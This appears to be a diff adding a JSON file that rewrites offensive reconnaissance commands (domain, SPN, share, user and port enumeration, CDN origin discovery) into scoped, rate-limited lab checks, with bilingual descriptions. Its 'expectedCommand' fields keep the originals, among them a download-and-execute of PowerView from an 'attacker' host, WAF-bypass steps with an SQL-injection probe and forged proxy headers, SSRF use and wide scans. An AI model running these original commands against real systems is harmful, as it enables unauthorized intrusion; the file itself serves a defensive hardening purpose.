@@ -1,0 +1,1951 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "domain-recon",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "net config workstation",
+          "command": "net config workstation\nwhoami /upn",
+          "title": {
+            "zh": "确认工作站域上下文",
+            "en": "Confirm the Workstation Domain Context"
+          },
+          "description": {
+            "zh": "读取当前工作站的域、登录域和系统配置摘要，先确认命令运行在哪个授权域上下文。",
+            "en": "Read the workstation domain, logon domain, and configuration summary to confirm the authorized domain context before further queries."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "nltest /dclist:domain.com",
+          "command": "nltest /dclist:{DOMAIN}",
+          "title": {
+            "zh": "列出指定域的域控制器",
+            "en": "List Domain Controllers for One Domain"
+          },
+          "description": {
+            "zh": "仅查询占位符 {DOMAIN} 对应域的域控制器列表，并把结果与 DNS SRV 记录和资产清单交叉核对。",
+            "en": "Query domain controllers only for {DOMAIN}, then compare the result with DNS SRV records and the authorized asset inventory."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "net user /domain",
+          "command": "net user /domain\nwhoami /groups",
+          "title": {
+            "zh": "读取域用户与当前组上下文",
+            "en": "Read Domain Users and the Current Group Context"
+          },
+          "description": {
+            "zh": "读取域用户名称清单并记录当前主体的组令牌，用于区分目录可见性和本机有效授权，不尝试任何认证。",
+            "en": "Read the domain user-name list and current principal group token to distinguish directory visibility from effective local authorization without attempting authentication."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "net group \"Domain Admins\" /domain",
+          "command": "Get-ADGroupMember -Identity \"Domain Admins\" -Recursive | Select-Object Name,SamAccountName,ObjectClass",
+          "title": {
+            "zh": "核对域管理员组成员",
+            "en": "Review Domain Admins Membership"
+          },
+          "description": {
+            "zh": "读取 Domain Admins 当前成员并与批准的高权限账号基线比较，不修改组成员关系。",
+            "en": "Read current Domain Admins membership and compare it with the approved privileged-account baseline without changing group membership."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "nltest /domain_trusts",
+          "command": "nltest /domain_trusts /all_trusts",
+          "title": {
+            "zh": "读取域信任摘要",
+            "en": "Read the Domain Trust Summary"
+          },
+          "description": {
+            "zh": "读取当前域可见的信任关系摘要，记录方向、类型和目标域，并以目录配置为最终依据。",
+            "en": "Read the visible trust summary for the current domain, recording direction, type, and target domain while treating directory configuration as authoritative."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker/PowerView.ps1\"); Get-NetDomain",
+          "command": "Import-Module .\\PowerView.ps1\nGet-Domain -Domain {DOMAIN}",
+          "title": {
+            "zh": "从本地模块读取域对象",
+            "en": "Read the Domain Object from a Local Module"
+          },
+          "description": {
+            "zh": "从已审查的本地 PowerView 文件导入模块并读取 {DOMAIN} 域对象，禁止通过网络下载并直接执行脚本。",
+            "en": "Import a reviewed local PowerView file and read the {DOMAIN} domain object; do not download and execute scripts over the network."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 6,
+          "expectedCommand": "Get-DomainPolicy",
+          "command": "Get-DomainPolicy -Domain {DOMAIN}",
+          "title": {
+            "zh": "读取域策略基线",
+            "en": "Read the Domain Policy Baseline"
+          },
+          "description": {
+            "zh": "使用已加载的 PowerView 模块读取指定域策略，重点核对口令、锁定和 Kerberos 配置，不做任何策略修改。",
+            "en": "Use the loaded PowerView module to read password, lockout, and Kerberos policy for one domain without modifying policy."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 7,
+          "expectedCommand": "Get-NetDomainController",
+          "command": "Get-DomainController -Domain {DOMAIN}",
+          "title": {
+            "zh": "读取域控制器对象",
+            "en": "Read Domain Controller Objects"
+          },
+          "description": {
+            "zh": "使用已加载的 PowerView 模块读取指定域的控制器对象，并与 nltest 和 DNS 结果交叉验证。",
+            "en": "Use the loaded PowerView module to read domain-controller objects for one domain and cross-check them against nltest and DNS results."
+          }
+        }
+      ]
+    },
+    {
+      "id": "cdn-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# DNS历史记录查询获取真实IP:\n# 1. SecurityTrails(需要API Key):\ncurl -s \"https://api.securitytrails.com/v1/history/target.com/dns/a\"   -H \"APIKEY: YOUR_KEY\" | jq '.records[].values[].ip'\n\n# 2. ViewDNS:\ncurl -s \"https://viewdns.info/iphistory/?domain=target.com\"\n\n# 3. DNS DB在线查询:\n# https://dnsdb.io/\n# https://securitytrails.com/\n# https://completedns.com/\n\n# 4. Censys搜索:\ncurl -s \"https://search.censys.io/api/v2/hosts/search?q=target.com\"   -u \"API_ID:API_SECRET\"\n\n# 5. 使用FOFA:\n# domain=\"target.com\" && type=\"A\"\n\n# 6. 多地Ping对比:\nnslookup target.com 8.8.8.8\nnslookup target.com 1.1.1.1",
+          "command": "dig +short {DOMAIN} A\ndig +short {DOMAIN} AAAA\ndig +short {DOMAIN} CNAME",
+          "title": {
+            "zh": "记录当前 DNS 基线",
+            "en": "Record the Current DNS Baseline"
+          },
+          "description": {
+            "zh": "读取授权域名当前的 A、AAAA 和 CNAME 记录，记录时间与解析器，用于和资产清单及 CDN 配置对照。",
+            "en": "Read current A, AAAA, and CNAME records for the authorized domain, recording time and resolver for comparison with the asset inventory and CDN configuration."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 通过邮件头泄露真实IP:\n# 1. 触发目标站点发送邮件(注册/找回密码/订阅):\ncurl -d \"email=attacker@gmail.com\" \"http://target.com/forgot-password\"\ncurl -d \"email=attacker@gmail.com\" \"http://target.com/subscribe\"\n\n# 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):\n# 查找以下字段中的IP:\n# Received: from mail.target.com (203.0.113.50)\n# X-Originating-IP: [203.0.113.50]\n# Return-Path: <noreply@target.com>\n\n# 3. 使用swaks发送邮件触发:\nswaks --to attacker@gmail.com --from test@target.com --server target.com\n\n# 4. 分析邮件头:\n# 最底部的Received字段通常包含源服务器真实IP\n\n# 5. 如果目标有RSS订阅:\n# 订阅后查看请求来源IP\ncurl \"http://target.com/rss\" -v",
+          "command": "dig +short {DOMAIN} MX\ndig +short {DOMAIN} TXT",
+          "title": {
+            "zh": "核对邮件与 TXT 记录",
+            "en": "Review Mail and TXT Records"
+          },
+          "description": {
+            "zh": "读取 MX 与 TXT 记录以识别公开邮件和策略端点，只记录公开 DNS 元数据，不触发邮件或业务流程。",
+            "en": "Read MX and TXT records to identify public mail and policy endpoints while recording public DNS metadata only and without triggering mail or business workflows."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 1. DNS历史记录查询:\n# SecurityTrails:\ncurl -s \"https://api.securitytrails.com/v1/history/target.com/dns/a\"   -H \"APIKEY: YOUR_KEY\" | python3 -m json.tool\n\n# 在线查询:\n# https://viewdns.info/iphistory/?domain=target.com\n# https://completedns.com/dns-history/\n# https://dnshistory.org/dns-records/target.com\n\n# 2. 证书透明度日志(CT Log):\ncurl -s \"https://crt.sh/?q=target.com&output=json\" |   python3 -c \"import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]\"\n\n# 3. Censys搜索:\n# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com\n\n# 4. FOFA/Shodan搜索:\n# FOFA: cert=\"target.com\"\n# Shodan: ssl.cert.subject.cn:target.com",
+          "command": "curl -sS \"https://crt.sh/?q=%25.{DOMAIN}&output=json\" | jq -r '.[].name_value' | sort -u",
+          "title": {
+            "zh": "查询证书透明度名称",
+            "en": "Query Certificate Transparency Names"
+          },
+          "description": {
+            "zh": "从公开证书透明度数据提取与授权域名相关的名称候选，结果仍需通过 DNS 和资产所有权复核。",
+            "en": "Extract names related to the authorized domain from public certificate-transparency data, then verify candidates through DNS and asset ownership."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 1. 子域名可能未经CDN:\nfor sub in mail ftp ssh vpn dev staging test api admin mx; do\n  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)\n  [ -n \"$ip\" ] && echo \"${sub}.target.com → $ip\"\ndone\n\n# 2. MX记录(邮件服务器通常不走CDN):\ndig +short target.com MX\ndig +short $(dig +short target.com MX | awk '{print $2}') A\n\n# 3. SPF记录中的IP:\ndig +short target.com TXT | grep -i \"spf\"\n# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP\n\n# 4. 触发目标服务器主动连接:\n# 在目标网站留下一个URL(如头像、webhook)指向自己的服务器\n# 查看连接IP(这是目标的出站IP，通常是真实IP):\n# nc -lvp 8888\n\n# 5. SSRF利用:\n# 如果存在SSRF漏洞，让服务器连接外部获取IP\ncurl \"http://target.com/api/fetch?url=http://your-server.com/log-ip\"",
+          "command": "subfinder -silent -d {DOMAIN} | sort -u",
+          "title": {
+            "zh": "生成被动子域候选",
+            "en": "Generate Passive Subdomain Candidates"
+          },
+          "description": {
+            "zh": "使用被动数据源生成授权域名的子域候选，只把可解析且属于资产清单的名称纳入后续检查。",
+            "en": "Generate passive subdomain candidates for the authorized domain and retain only names that resolve and belong to the approved asset inventory."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# 1. 验证候选IP是否是真实服务器:\nREAL_IP=\"203.0.113.50\"\n\n# 直接IP访问(Host头指定域名):\ncurl -sI \"http://${REAL_IP}/\" -H \"Host: target.com\"\n\n# HTTPS访问(忽略证书):\ncurl -sk \"https://${REAL_IP}/\" -H \"Host: target.com\"\n\n# 2. 对比响应确认:\ncdn_resp=$(curl -s \"https://target.com/\" | md5sum)\ndirect_resp=$(curl -sk \"https://${REAL_IP}/\" -H \"Host: target.com\" | md5sum)\necho \"CDN: $cdn_resp\"\necho \"Direct: $direct_resp\"\n[ \"$cdn_resp\" = \"$direct_resp\" ] && echo \"[+] CONFIRMED: Real IP!\"\n\n# 3. 修改hosts绕过CDN测试:\necho \"${REAL_IP} target.com\" | sudo tee -a /etc/hosts\n\n# 4. 直接对真实IP进行渗透(绕过CDN的WAF):\nnmap -sV -p 1-65535 ${REAL_IP}\n# CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过",
+          "command": "curl -sS -D edge.headers -o edge.body \"https://{DOMAIN}/healthz\"\ncurl -sS -D origin.headers -o origin.body --resolve \"{DOMAIN}:443:{ORIGIN_IP}\" \"https://{DOMAIN}/healthz\"",
+          "title": {
+            "zh": "对比边缘与登记源站健康响应",
+            "en": "Compare Edge and Registered-Origin Health Responses"
+          },
+          "description": {
+            "zh": "仅对自有登记源站的固定 healthz 路径比较边缘与直连响应，保存状态、证书和响应头，不扫描其他端口或路径。",
+            "en": "Compare edge and direct responses only for a fixed health endpoint on a registered owned origin, preserving status, certificate, and headers without scanning other ports or paths."
+          }
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 找到真实IP后，CDN的WAF就被完全绕过了\n# 但如果目标自身也有WAF，还需要:\n\n# 1. 使用真实IP直接访问(绕过CDN WAF):\ncurl -sk \"https://REAL_IP/vulnerable?id=1' OR 1=1--\" -H \"Host: target.com\"\n\n# 2. 如果CDN仅对常见端口做WAF:\n# 扫描非标端口的Web服务:\nnmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP\n\n# 3. IPv6绕过(CDN可能只保护IPv4):\ndig +short target.com AAAA\ncurl -6 \"http://[IPv6_ADDRESS]/\" -H \"Host: target.com\"\n\n# 4. 源站IP白名单探测:\n# 某些源站配置了仅允许CDN IP访问\n# 尝试伪造CDN的IP:\ncurl -H \"CF-Connecting-IP: 1.2.3.4\" \"http://REAL_IP/\" -H \"Host: target.com\"\ncurl -H \"X-Forwarded-For: CDN_IP\" \"http://REAL_IP/\" -H \"Host: target.com\"",
+          "command": "curl -sS -o edge-health.body -w \"edge=%{http_code}\\n\" \"https://{DOMAIN}/healthz\"\ncurl -sS -o origin-health.body -w \"origin=%{http_code}\\n\" --resolve \"{DOMAIN}:443:{ORIGIN_IP}\" \"https://{DOMAIN}/healthz\"",
+          "title": {
+            "zh": "复测源站访问控制",
+            "en": "Retest Origin Access Control"
+          },
+          "description": {
+            "zh": "修复后对同一健康检查分别访问 CDN 和登记源站，确认边缘可用且源站按预期拒绝未授权直连。",
+            "en": "After remediation, request the same health endpoint through the CDN and the registered origin to confirm edge availability and expected rejection of unauthorized direct access."
+          }
+        }
+      ]
+    },
+    {
+      "id": "spn-scan",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "setspn -T domain.com -Q */*",
+          "command": "setspn -Q HTTP/{SERVICE_HOST}",
+          "title": {
+            "zh": "查询单一 HTTP 服务 SPN",
+            "en": "Query One HTTP Service SPN"
+          },
+          "description": {
+            "zh": "仅查询授权服务主机对应的 HTTP SPN，并记录登记主体，不再使用 */* 枚举整个域。",
+            "en": "Query the HTTP SPN for one authorized service host and record its registered principal instead of enumerating every SPN in the domain."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "Get-ADUser -Filter {ServicePrincipalName -like \"*\"} -Properties ServicePrincipalName",
+          "command": "Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -SearchBase '{SEARCH_BASE}' -ResultSetSize 100 -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName",
+          "title": {
+            "zh": "在 SearchBase 内读取 SPN 用户",
+            "en": "Read SPN Users Within One SearchBase"
+          },
+          "description": {
+            "zh": "把查询限制到批准的 SearchBase 和最多 100 个结果，只输出账号与 SPN 属性。",
+            "en": "Limit the query to the approved SearchBase and at most 100 results, returning only account and SPN properties."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "GetUserSPNs.py domain/user:password -dc-ip dc_ip",
+          "command": "impacket-GetUserSPNs -h",
+          "title": {
+            "zh": "查看 Impacket SPN 查询参数",
+            "en": "Inspect Impacket SPN Query Arguments"
+          },
+          "description": {
+            "zh": "只查看已安装版本的参数，不在命令行嵌入域凭证或请求任何服务票据。",
+            "en": "Inspect arguments for the installed version without embedding domain credentials or requesting service tickets."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "setspn -T domain.com -Q HTTP/*",
+          "command": "setspn -T {DOMAIN} -Q HTTP/{SERVICE_HOST}",
+          "title": {
+            "zh": "在指定域核对 HTTP SPN",
+            "en": "Review an HTTP SPN in One Domain"
+          },
+          "description": {
+            "zh": "在单一授权域中核对一个 HTTP 服务主机，避免通配服务和全域结果集。",
+            "en": "Review one HTTP service host in one authorized domain without wildcard services or domain-wide result sets."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "setspn -T domain.com -Q MSSQLSvc/*",
+          "command": "setspn -T {DOMAIN} -Q MSSQLSvc/{SERVICE_HOST}:{SERVICE_PORT}",
+          "title": {
+            "zh": "核对单一 MSSQL 服务 SPN",
+            "en": "Review One MSSQL Service SPN"
+          },
+          "description": {
+            "zh": "查询一个已登记主机和端口的 MSSQLSvc SPN，并与服务账号清单核对。",
+            "en": "Query the MSSQLSvc SPN for one registered host and port and compare it with the service-account inventory."
+          }
+        }
+      ]
+    },
+    {
+      "id": "port-scan",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "nmap -sS -T4 -F 192.168.1.0/24",
+          "command": "nmap -sT -Pn --top-ports 20 --max-rate 20 --max-retries 1 {LAB_HOST}",
+          "title": {
+            "zh": "低速核对常见 TCP 端口",
+            "en": "Review Common TCP Ports at a Low Rate"
+          },
+          "description": {
+            "zh": "仅对单一实验主机检查常见 20 个 TCP 端口，并限制速率和重试次数。",
+            "en": "Check the 20 most common TCP ports on one lab host with explicit rate and retry limits."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "nmap -sS -p- 192.168.1.1",
+          "command": "nmap -sT -Pn -p 22,80,443,445,3389 --max-rate 10 --max-retries 1 {LAB_HOST}",
+          "title": {
+            "zh": "核对批准的 TCP 端口集合",
+            "en": "Review an Approved TCP Port Set"
+          },
+          "description": {
+            "zh": "使用显式五端口列表替代全端口扫描，目标固定为一个授权实验主机。",
+            "en": "Replace the full-port scan with an explicit five-port list against one authorized lab host."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "nmap -sV -sC 192.168.1.1",
+          "command": "nmap -sT -sV --version-light -Pn -p 22,80,443 --max-rate 10 {LAB_HOST}",
+          "title": {
+            "zh": "轻量识别三个服务端口",
+            "en": "Lightly Identify Three Service Ports"
+          },
+          "description": {
+            "zh": "只对三个批准端口执行轻量版本识别，不运行默认或漏洞 NSE 脚本。",
+            "en": "Run light version detection on three approved ports without default or vulnerability NSE scripts."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "nmap -sn 192.168.1.0/24",
+          "command": "nmap -sn --max-rate 5 --max-retries 1 {LAB_HOST}",
+          "title": {
+            "zh": "确认单一实验主机可达性",
+            "en": "Confirm Reachability of One Lab Host"
+          },
+          "description": {
+            "zh": "只检查一个登记主机是否可达，不枚举整个网段。",
+            "en": "Check reachability for one registered host without enumerating a network range."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "masscan -p1-65535 192.168.1.0/24 --rate=1000",
+          "command": "nmap -sT -Pn -p 80,443 --max-rate 5 --max-retries 1 {LAB_HOST}",
+          "title": {
+            "zh": "以有界 Nmap 代替 Masscan",
+            "en": "Replace Masscan with a Bounded Nmap Check"
+          },
+          "description": {
+            "zh": "移除高速全端口 Masscan，仅对一个实验主机的两个 Web 端口执行低速检查。",
+            "en": "Remove high-speed full-port Masscan and check only two web ports on one lab host at a low rate."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "nmap -O 192.168.1.1",
+          "command": "nmap -O --osscan-limit --max-os-tries 1 --max-rate 5 --max-retries 1 --host-timeout 30s -Pn -p 22,80,443 {LAB_HOST}",
+          "title": {
+            "zh": "限制操作系统指纹尝试",
+            "en": "Limit Operating-System Fingerprint Attempts"
+          },
+          "description": {
+            "zh": "仅对有响应端口的单一实验主机执行一次受限 OS 指纹尝试。",
+            "en": "Run one limited OS fingerprint attempt against a single lab host with responsive ports."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 6,
+          "expectedCommand": "nmap -sU --top-ports 20 192.168.1.1",
+          "command": "nmap -sU --top-ports 5 --max-rate 5 --max-retries 1 {LAB_HOST}",
+          "title": {
+            "zh": "低速核对五个 UDP 端口",
+            "en": "Review Five UDP Ports at a Low Rate"
+          },
+          "description": {
+            "zh": "把 UDP 检查限定到一个实验主机、五个常见端口和一次重试。",
+            "en": "Limit UDP review to one lab host, five common ports, and one retry."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 7,
+          "expectedCommand": "nmap --script vuln 192.168.1.1",
+          "command": "nmap -sT -Pn -p 80,443 --script http-title,http-headers --max-rate 5 {LAB_HOST}",
+          "title": {
+            "zh": "运行非侵入 HTTP 元数据脚本",
+            "en": "Run Non-Intrusive HTTP Metadata Scripts"
+          },
+          "description": {
+            "zh": "使用 http-title 和 http-headers 替代 vuln 脚本，只收集两个 Web 端口的响应元数据。",
+            "en": "Use http-title and http-headers instead of vulnerability scripts and collect response metadata from two web ports only."
+          }
+        }
+      ]
+    },
+    {
+      "id": "network-recon",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "ipconfig /all",
+          "command": "Get-NetIPConfiguration -Detailed | Select-Object -First 50 InterfaceAlias,IPv4Address,IPv6Address,DNSServer,NetProfile",
+          "title": {
+            "zh": "读取有界 Windows 接口配置",
+            "en": "Read a Bounded Windows Interface Configuration"
+          },
+          "description": {
+            "zh": "使用 PowerShell 读取最多 50 条本机接口、地址、DNS 和网络配置摘要，不修改网络配置。",
+            "en": "Use PowerShell to read at most 50 local interface, address, DNS, and network configuration summaries without modifying network configuration."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "route print",
+          "command": "Get-NetRoute -AddressFamily IPv4 | Sort-Object RouteMetric | Select-Object -First 50 DestinationPrefix,NextHop,InterfaceAlias,RouteMetric",
+          "title": {
+            "zh": "读取有界 Windows 路由表",
+            "en": "Read a Bounded Windows Route Table"
+          },
+          "description": {
+            "zh": "按路由度量读取最多 50 条 IPv4 路由与接口信息，和批准的分段基线比较。",
+            "en": "Read at most 50 IPv4 routes and interface details ordered by metric, then compare them with the approved segmentation baseline."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "arp -a",
+          "command": "Get-NetNeighbor -AddressFamily IPv4 | Select-Object -First 100 IPAddress,LinkLayerAddress,State,InterfaceAlias",
+          "title": {
+            "zh": "读取有界本机邻居缓存",
+            "en": "Read a Bounded Local Neighbor Cache"
+          },
+          "description": {
+            "zh": "读取最多 100 条现有 IPv4 邻居缓存，不发送额外探测包。",
+            "en": "Read at most 100 existing IPv4 neighbor-cache entries without sending additional probes."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "netstat -ano",
+          "command": "Get-NetTCPConnection | Where-Object State -in 'Listen','Established' | Select-Object -First 100 LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess",
+          "title": {
+            "zh": "读取有限 TCP 连接清单",
+            "en": "Read a Limited TCP Connection List"
+          },
+          "description": {
+            "zh": "读取最多 100 条监听或已建立连接，并关联本机进程。",
+            "en": "Read at most 100 listening or established connections and correlate them with local processes."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "ipconfig /displaydns",
+          "command": "Get-DnsClientCache | Select-Object -First 100 Entry,RecordName,RecordType,Status",
+          "title": {
+            "zh": "读取有界 Windows DNS 缓存",
+            "en": "Read a Bounded Windows DNS Cache"
+          },
+          "description": {
+            "zh": "读取最多 100 条本机 DNS 缓存记录用于故障排查，不触发远程解析。",
+            "en": "Read at most 100 local DNS cache records for troubleshooting without triggering remote resolution."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "ifconfig -a",
+          "command": "ip -brief address",
+          "title": {
+            "zh": "读取 Linux 接口摘要",
+            "en": "Read the Linux Interface Summary"
+          },
+          "description": {
+            "zh": "使用 iproute2 输出本机接口与地址摘要，不使用已弃用的 ifconfig。",
+            "en": "Use iproute2 to show local interface and address summaries instead of deprecated ifconfig output."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 6,
+          "expectedCommand": "route -n",
+          "command": "ip -4 route show table main | head -n 50",
+          "title": {
+            "zh": "读取有界 Linux 路由表",
+            "en": "Read a Bounded Linux Route Table"
+          },
+          "description": {
+            "zh": "读取 Linux 主路由表最多 50 行并与实验拓扑核对，不修改路由。",
+            "en": "Read at most 50 lines from the Linux main route table and compare them with the lab topology without changing routes."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 7,
+          "expectedCommand": "tracert target_ip",
+          "command": "tracert -d -h 5 -w 500 {LAB_GATEWAY}",
+          "title": {
+            "zh": "限制到实验网关的路由跟踪",
+            "en": "Trace a Route Only to the Lab Gateway"
+          },
+          "description": {
+            "zh": "仅对登记实验网关执行最多五跳、每跳 500 毫秒的路由跟踪。",
+            "en": "Trace only the registered lab gateway with at most five hops and a 500 millisecond timeout per hop."
+          }
+        }
+      ]
+    },
+    {
+      "id": "share-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "net share",
+          "command": "Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 50 Name,Path,Description",
+          "title": {
+            "zh": "读取有界本机共享清单",
+            "en": "Read a Bounded Local Share List"
+          },
+          "description": {
+            "zh": "使用 SMB 模块读取最多 50 个本机已发布共享及其路径，不创建、删除或修改共享。",
+            "en": "Use the SMB module to read at most 50 local published shares and paths without creating, deleting, or modifying shares."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "net view \\\\target_ip",
+          "command": "net view \\\\{LAB_HOST}",
+          "title": {
+            "zh": "读取单一实验主机共享",
+            "en": "Read Shares on One Lab Host"
+          },
+          "description": {
+            "zh": "只查询一个授权实验主机公布的共享名称，不扩展到工作组或网段。",
+            "en": "Query published share names on one authorized lab host without expanding to a workgroup or network range."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "smbmap -H target_ip -u user -p password",
+          "command": "smbclient -L //{LAB_HOST}/ -U {LAB_USER}",
+          "title": {
+            "zh": "使用交互凭证列出共享",
+            "en": "List Shares with Interactive Credentials"
+          },
+          "description": {
+            "zh": "对单一实验主机使用专用测试账号并交互输入凭证，避免把密码写入命令。",
+            "en": "Use a dedicated test identity against one lab host and enter credentials interactively instead of placing a password in the command."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "crackmapexec smb target_ip -u user -p password --shares",
+          "command": "nxc smb {LAB_HOST} -u {LAB_USER} -p ./fixtures/lab-password.txt --shares --timeout 5",
+          "title": {
+            "zh": "使用 NetExec 核对共享权限",
+            "en": "Review Share Permissions with NetExec"
+          },
+          "description": {
+            "zh": "使用本地实验凭证文件对一个主机执行一次共享查询，并设置五秒超时。",
+            "en": "Use a local lab credential file for one share query against one host with a five-second timeout."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "smbclient -L target_ip -U user%password",
+          "command": "smbclient -L //{LAB_HOST}/ -U {LAB_USER} --option='client min protocol=SMB2'",
+          "title": {
+            "zh": "以 SMB2 最低协议列出共享",
+            "en": "List Shares with SMB2 as the Minimum Protocol"
+          },
+          "description": {
+            "zh": "对一个实验主机列出共享并显式禁用 SMB1 协商，不读取文件内容。",
+            "en": "List shares on one lab host while disabling SMB1 negotiation and without reading file content."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "Find-InterestingDomainShareFile",
+          "command": "Find-DomainShare -Domain {DOMAIN} -CheckShareAccess | Select-Object -First 20 Name,ComputerName",
+          "title": {
+            "zh": "限制 PowerView 共享查询结果",
+            "en": "Limit PowerView Share Query Results"
+          },
+          "description": {
+            "zh": "只返回指定域最多 20 个当前身份可见的共享，不递归搜索共享文件。",
+            "en": "Return at most 20 shares visible to the current identity in one domain without recursively searching files."
+          }
+        }
+      ]
+    },
+    {
+      "id": "user-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "net user /domain",
+          "command": "Get-ADUser -Filter * -SearchBase '{SEARCH_BASE}' -ResultSetSize 100 | Select-Object SamAccountName,Enabled,DistinguishedName",
+          "title": {
+            "zh": "在 SearchBase 内读取用户摘要",
+            "en": "Read User Summaries Within One SearchBase"
+          },
+          "description": {
+            "zh": "限定批准的 SearchBase 和最多 100 个结果，只输出账号、启用状态和 DN。",
+            "en": "Limit the query to the approved SearchBase and at most 100 results, returning account, enabled state, and distinguished name only."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "net user username /domain",
+          "command": "Get-ADUser -Identity {LAB_USER} -Properties Enabled,LastLogonDate,MemberOf | Select-Object SamAccountName,Enabled,LastLogonDate,MemberOf",
+          "title": {
+            "zh": "读取单一实验用户属性",
+            "en": "Read One Lab User Object"
+          },
+          "description": {
+            "zh": "读取专用实验用户的有限属性，不遍历其他账号或认证数据。",
+            "en": "Read a limited property set for one dedicated lab user without traversing other identities or authentication data."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "Get-NetUser | select samaccountname,description,admincount",
+          "command": "Get-DomainUser -Identity {LAB_USER} -Domain {DOMAIN} | Select-Object SamAccountName,Enabled,AdminCount",
+          "title": {
+            "zh": "使用 PowerView 读取实验用户",
+            "en": "Read a Lab User with PowerView"
+          },
+          "description": {
+            "zh": "使用已审查的本地 PowerView 模块读取一个实验用户对象。",
+            "en": "Use a reviewed local PowerView module to read one lab user object."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "Get-NetUser -AdminCount | select samaccountname",
+          "command": "Get-DomainUser -LDAPFilter '(adminCount=1)' -Domain {DOMAIN} | Select-Object -First 50 SamAccountName,AdminCount",
+          "title": {
+            "zh": "限制高权限标记用户查询",
+            "en": "Limit the Privileged-Flag User Query"
+          },
+          "description": {
+            "zh": "最多返回 50 个 adminCount 标记对象，并以实际组成员和 ACL 复核，不把标记直接视为管理员权限。",
+            "en": "Return at most 50 adminCount-marked objects and verify them against actual group membership and ACLs instead of treating the flag as administrative access."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}",
+          "command": "Get-ADUser -Filter 'Enabled -eq $true' -SearchBase '{SEARCH_BASE}' -ResultSetSize 50 -Properties LastLogonDate | Select-Object SamAccountName,LastLogonDate",
+          "title": {
+            "zh": "读取有限活跃用户基线",
+            "en": "Read a Limited Active-User Baseline"
+          },
+          "description": {
+            "zh": "在批准 SearchBase 内最多读取 50 个启用账号及其登录时间，用于和账号生命周期基线比较。",
+            "en": "Read at most 50 enabled identities and their logon dates within the approved SearchBase for comparison with the identity-lifecycle baseline."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "GetADUsers.py -all domain/user:password -dc-ip dc_ip",
+          "command": "impacket-GetADUsers -h",
+          "title": {
+            "zh": "查看 Impacket 用户查询参数",
+            "en": "Inspect Impacket User Query Arguments"
+          },
+          "description": {
+            "zh": "只查看已安装版本参数，不在命令行嵌入域密码或执行全域查询。",
